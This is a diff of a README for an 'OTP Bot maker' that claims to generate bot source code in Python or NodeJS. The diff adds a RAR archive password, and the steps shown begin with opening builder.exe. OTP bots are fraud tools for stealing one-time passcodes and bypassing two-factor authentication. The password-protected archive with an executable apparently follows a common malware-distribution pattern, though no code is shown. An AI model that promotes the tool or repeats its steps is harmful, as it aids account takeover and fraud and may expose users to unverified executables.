@@ -1,5 +1,7 @@
 First ever OTP Bot maker for beginners. Generate your own OTP source in python or nodejs with any features you like!
 
+# RAR PASSWORD: KE47vM9U7V3ahgI
+
 1. Open builder.exe
 
 2. Select the bot language (Python, NodeJS)
